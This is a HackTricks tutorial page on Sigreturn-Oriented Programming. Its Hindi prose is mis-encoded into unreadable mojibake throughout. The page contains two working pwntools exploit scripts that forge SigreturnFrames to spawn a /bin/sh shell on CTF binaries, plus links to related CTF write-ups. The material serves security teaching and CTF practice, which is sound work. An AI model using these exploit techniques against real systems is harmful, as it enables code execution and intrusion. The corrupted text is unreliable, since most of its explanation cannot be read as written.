# SROP - рд╕рд┐рдЧрд░рд┐рдЯрд░реНрди-рдУрд░рд┐рдПрдВрдЯреЗрдб рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, **The PEASS Family** рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** рджреНрд╡рд╛рд░рд╛ **PR рдЬрдорд╛ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

**`Sigreturn`** рдПрдХ рд╡рд┐рд╢реЗрд╖ **рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдореБрдЦреНрдп рдЙрдкрдпреЛрдЧ рд╕рд┐рдЧреНрдирд▓ рд╣реИрдВрдбрд▓рд░ рдХреЗ рдкреВрд░реНрдг рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рд╕рдлрд╛рдИ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рд╕рд┐рдЧреНрдирд▓реНрд╕ рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ рдСрдкрд░реЗрдЯрд┐рдВрдЧ рд╕рд┐рд╕реНрдЯрдо рджреНрд╡рд╛рд░рд╛ рднреЗрдЬреЗ рдЧрдП рд╡рд┐рдШрдЯрдиреЛрдВ рдХреЛ рд╕реВрдЪрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдХреНрд╕рд░ рднреЗрдЬреЗ рдЬрд╛рддреЗ рд╣реИрдВред рдЬрдм рдПрдХ рдХрд╛рд░реНрдпрдХреНрд░рдо рдПрдХ рд╕рд┐рдЧреНрдирд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдЕрдкрдиреЗ рд╡рд░реНрддрдорд╛рди рдХрд╛рд░реНрдп рдХреЛ рд░реЛрдХ рджреЗрддрд╛ рд╣реИ рддрд╛рдХрд┐ рд╡рд╣ рд╕рд┐рдЧреНрдирд▓ рд╣реИрдВрдбрд▓рд░ рдХреЗ рд╕рд╛рде рд╕рд┐рдЧреНрдирд▓ рдХрд╛ рд╕рдорд╛рдЪрд╛рд░ рдХрд░ рд╕рдХреЗ, рдЬреЛ рд╕рд┐рдЧреНрдирд▓ рдХреЛ рд╕рдВрдмреЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдбрд┐рдЬрд╝рд╛рдЗрди рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╡рд┐рд╢реЗрд╖ рдХрд╛рд░реНрдп рд╣реИред

рд╕рд┐рдЧреНрдирд▓ рд╣реИрдВрдбрд▓рд░ рд╕рдорд╛рдкреНрдд рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж, рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ **рдкрд┐рдЫрд▓реА рд╕реНрдерд┐рддрд┐ рдкреБрдирдГ рдЖрд░рдВрдн** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ рдХрд┐ рдХреБрдЫ рдирд╣реАрдВ рд╣реБрдЖ рд╣реИред рдпрд╣рд╛рдБ **`sigreturn`** рдХрд╛рдо рдЖрддрд╛ рд╣реИред рдпрд╣ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреЛ **рд╕рд┐рдЧреНрдирд▓ рд╣реИрдВрдбрд▓рд░ рд╕реЗ рд╡рд╛рдкрд╕ рд▓реМрдЯрдиреЗ** рдФрд░ рд╕реНрдЯреИрдХ рдлреНрд░реЗрдо (рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓реНрд╕ рдФрд░ рд╕реНрдерд╛рдиреАрдп рдЪрд░) рдХреЛ рд╕рд╛рдл рдХрд░рдХреЗ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдореЗрдВ рдорджрдж рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд╕рд┐рдЧреНрдирд▓ рд╣реИрдВрдбрд▓рд░ рджреНрд╡рд╛рд░рд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред

рд░реЛрдЪрдХ рднрд╛рдЧ рдпрд╣ рд╣реИ рдХрд┐ **`sigreturn`** рдХреИрд╕реЗ рдХрд╛рд░реНрдпрдХреНрд░рдо рдХреА рд╕реНрдерд┐рддрд┐ рдХреЛ рдкреБрдирд░реНрд╕реНрдерд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИ: рдпрд╣ **рд╕рднреА рд╕реАрдкреАрдпреВ рдХреЗ рд░рдЬрд┐рд╕реНрдЯрд░ рдорд╛рдиреЛрдВ рдХреЛ рд╕реНрдЯреИрдХ рдкрд░ рд╕реНрдЯреЛрд░** рдХрд░рдХреЗ рдРрд╕рд╛ рдХрд░рддрд╛ рд╣реИред рдЬрдм рд╕рд┐рдЧреНрдирд▓ рдЕрдм рдФрд░ рдирд╣реАрдВ рдмреНрд▓реЙрдХ рд╣реЛрддрд╛ рд╣реИ, **`sigreturn` рдЗрди рдорд╛рдиреЛрдВ рдХреЛ рд╕реНрдЯреИрдХ рд╕реЗ рдкреЙрдк** рдХрд░рддрд╛ рд╣реИ, рдЕрд╕рд▓ рдореЗрдВ рд╕реАрдкреАрдпреВ рдХреЗ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЛ рдЙрдирдХреА рд╕реНрдерд┐рддрд┐ рдкреБрдирдГ рд╕реЗрдЯ рдХрд░рддрд╛ рд╣реИ рдЬрд┐рд╕рд╕реЗ рд╕рд┐рдЧреНрдирд▓ рдХреЛ рд╣реИрдВрдбрд▓ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред рдЗрд╕рдореЗрдВ рд╕реНрдЯреИрдХ рдкреНрд╡рд╛рдЗрдВрдЯрд░ рд░рдЬрд┐рд╕реНрдЯрд░ (рдЖрд░рдПрд╕рдкреА), рдЬреЛ рд╡рд░реНрддрдорд╛рди рд╕реНрдЯреИрдХ рдХреЗ рд╢реАрд░реНрд╖ рдХреЛ рджрд░реНрд╢рд╛рддрд╛ рд╣реИ, рднреА рд╢рд╛рдорд┐рд▓ рд╣реИред

{% hint style="danger" %}
рдПрдХ рдЖрд░рдУрдкреА рд╢реНрд░реГрдВрдЦрд▓рд╛ рд╕реЗ рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ **`sigreturn`** рдХреЛ рдмреБрд▓рд╛рдирд╛ рдФрд░ **рд╕реНрдЯреИрдХ** рдореЗрдВ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рд╣рдореЗрдВ рдЪрд╛рд╣рд┐рдП рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдорд╛рди** рдЬрд┐рдиреНрд╣реЗрдВ рд╣рдо рдЪрд╛рд╣реЗрдВрдЧреЗ рдХрд┐ рдпрд╣ **рдирд┐рдпрдВрддреНрд░рд┐рдд** рдХрд░реЗрдВ рдФрд░ рдЗрд╕рд▓рд┐рдП **рдХреЙрд▓** рдХрд░реЗрдВ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рд╕рд┐рд╕реНрдЯрдо рдХреЙрд▓ `execve` рдХреЗ рд▓рд┐рдП `/bin/sh`ред
{% endhint %}

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдпрд╣ рдПрдХ **рд░реЗрдЯ2рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдкреНрд░рдХрд╛рд░** рд╣реЛрдЧрд╛ рдЬреЛ рдЕрдиреНрдп рд░реЗрдЯ2рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдмреБрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдкреИрд░рд╛рдореНрд╕ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рдмрдирд╛рддрд╛ рд╣реИ:

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

рдпрджрд┐ рдЖрдк рдХреВрдЯрдиреАрддрд┐ рд╕реЗ рдЗрд╕рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рддреЛ рдпрд╣ рд╣реИ **рд╕рд┐рдЧрдХреЙрдиреНрдЯреЗрдХреНрд╕реНрдЯ рд╕рдВрд░рдЪрдирд╛** рдЬреЛ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рдВрдЧреНрд░рд╣рд┐рдд рд╣реИ рддрд╛рдХрд┐ рдмрд╛рдж рдореЗрдВ рдорд╛рдиреЛрдВ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ (рдбрд╛рдпрдЧреНрд░рд╛рдо рд╕реЗ [**рдпрд╣рд╛рдБ**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
## рдЙрджрд╛рд╣рд░рдг

рдЖрдк [**рдпрд╣рд╛рдБ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВ**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) рдЬрд╣рд╛рдБ рд╕рд╛рдЗрдирд░рд┐рдЯрд░реНрди рдХреЙрд▓ ROP рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдирд┐рд░реНрдорд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ (rxa рдореЗрдВ рдорд╛рди `0xf` рдбрд╛рд▓рдирд╛), рд╣рд╛рд▓рд╛рдВрдХрд┐ рдпрд╣ рд╡рд╣рд╛рдБ рд╕реЗ рдЕрдВрддрд┐рдо рдЙрддреНрдкреАрдбрд╝рди рд╣реИ:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
рдпрд╣рд╛рдБ рд╕реЗ [**рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯ рднреА рджреЗрдЦреЗрдВ**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) рдЬрд╣рд╛рдБ рдмрд╛рдЗрдирд░реА рдкрд╣рд▓реЗ рд╕реЗ рд╣реА `sigreturn` рдХреЛ рдХреЙрд▓ рдХрд░ рд░рд╣рд╛ рдерд╛ рдФрд░ рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ **ROP** рдХреЗ рд╕рд╛рде рдмрдирд╛рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдирд╣реАрдВ рд╣реИ:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## рдЕрдиреНрдп рдЙрджрд╛рд╣рд░рдг рдФрд░ рд╕рдВрджрд░реНрдн

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **рд╕реНрдЯреИрдХ рдкрд░ рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рдЕрд╕реЗрдореНрдмрд▓реА рдмрд╛рдЗрдирд░реА рдФрд░ рдлрд┐рд░ **`sigreturn`** рд╕рд┐рд╕рдХреЙрд▓ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред рд╕реНрдЯреИрдХ рдкрд░ [**ret2syscall**](rop-syscall-execv/) рд▓рд┐рдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдПрдХ **sigreturn** рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдФрд░ рдлреНрд▓реИрдЧ рдкрдврд╝рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреА рдореЗрдореЛрд░реА рдореЗрдВ рд╣реИред
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **рд╕реНрдЯреИрдХ рдкрд░ рд▓рд┐рдЦрдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рд╡рд╛рд▓рд╛ рдЕрд╕реЗрдореНрдмрд▓реА рдмрд╛рдЗрдирд░реА рдФрд░ рдлрд┐рд░ **`sigreturn`** рд╕рд┐рд╕рдХреЙрд▓ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред рд╕реНрдЯреИрдХ рдкрд░ [**ret2syscall**](rop-syscall-execv/) рд▓рд┐рдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ рдПрдХ **sigreturn** рд╕реНрдЯреНрд░рдХреНрдЪрд░ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ (рдмрд╛рдЗрдирд░реА рдореЗрдВ рд╕реНрдЯреНрд░рд┐рдВрдЧ `/bin/sh` рд╣реИ)ред
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64 рдмрд┐рдЯ, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, рдПрдирдПрдХреНрд╕, рдХреЛрдИ рдкрд╛рдИред `gets` рдлрдВрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕рд┐рдореНрдкрд▓ рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ рдЬреЛ [**ret2syscall**](rop-syscall-execv/) рдХрд░рддрд╛ рд╣реИред ROP рдЪреЗрди `.bss` рдореЗрдВ `/bin/sh` рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдлрд┐рд░ рд╕реЗ gets рдХреЛ рдХреЙрд▓ рдХрд░рдХреЗ рдХрд░рддрд╛ рд╣реИ, рдпрд╣ **`alarm`** рдлрдВрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рддрд╛рдХрд┐ eax рдХреЛ `0xf` рд╕реЗрдЯ рдХрд░рдХреЗ рдПрдХ **SROP** рдХреЛ рдХреЙрд▓ рдХрд░реЗрдВ рдФрд░ рд╢реИрд▓ рдХреЛ рдЪрд▓рд╛рдПрдВред
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64 рдмрд┐рдЯ рдЕрд╕реЗрдореНрдмрд▓реА рдкреНрд░реЛрдЧреНрд░рд╛рдо, рдХреЛрдИ relro рдирд╣реАрдВ, рдХреЛрдИ рдХреИрдиреЗрд░реА рдирд╣реАрдВ, рдПрдирдПрдХреНрд╕, рдХреЛрдИ рдкрд╛рдИред рдлреНрд▓реЛ рд╕реНрдЯреИрдХ рдореЗрдВ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдХрдИ рд░рдЬрд┐рд╕реНрдЯрд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рдФрд░ рдПрдХ рд╕рд┐рд╕рдХреЙрд▓ рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `exit` рдХреЛ рдХреЙрд▓ рдХрд░рддрд╛ рд╣реИред рдЪрдпрдирд┐рдд рд╕рд┐рд╕рдХреЙрд▓ рдПрдХ `sigreturn` рд╣реИ рдЬреЛ рд░рдЬрд┐рд╕реНрдЯреНрд░реА рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ `eip` рдХреЛ рдкрд┐рдЫрд▓реЗ рд╕рд┐рд╕рдХреЙрд▓ рдЗрдВрд╕реНрдЯреНрд░рдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░рдиреЗ рдФрд░ `memprotect` рдХреЛ рдЪрд▓рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ рдмрд╛рдЗрдирд░реА рд╕реНрдкреЗрд╕ рдХреЛ `rwx` рдФрд░ ESP рдХреЛ рдмрд╛рдЗрдирд░реА рд╕реНрдкреЗрд╕ рдореЗрдВ рд╕реЗрдЯ рдХрд░реЗрдЧрд╛ред рдлреНрд▓реЛ рдХрд╛ рдкрд╛рд▓рди рдХрд░рддреЗ рд╣реБрдП, рдкреНрд░реЛрдЧреНрд░рд╛рдо рдлрд┐рд░ рд╕реЗ ESP рдореЗрдВ рдкрдврд╝рдиреЗ рдХреЛ рдХреЙрд▓ рдХрд░реЗрдЧрд╛, рд▓реЗрдХрд┐рди рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ ESP рдЕрдЧрд▓реЗ рдЗрдВрдЯреНрд░рдХреНрд╢рди рдХреЛ рдкреЙрдЗрдВрдЯ рдХрд░ рд░рд╣рд╛ рд╣реЛрдЧрд╛ рдЗрд╕рд▓рд┐рдП рд╢реИрд▓рдХреЛрдб рдкрд╛рд╕ рдХрд░рдиреЗ рдкрд░ рдпрд╣ рдЗрд╕реЗ рдЕрдЧрд▓реЗ рдЗрдВрдЯреНрд░рдХреНрд╢рди рдХреЗ рд░реВрдк рдореЗрдВ рд▓рд┐рдЦреЗрдЧрд╛ рдФрд░ рдЗрд╕реЗ рдЪрд▓рд╛рдПрдЧрд╛ред
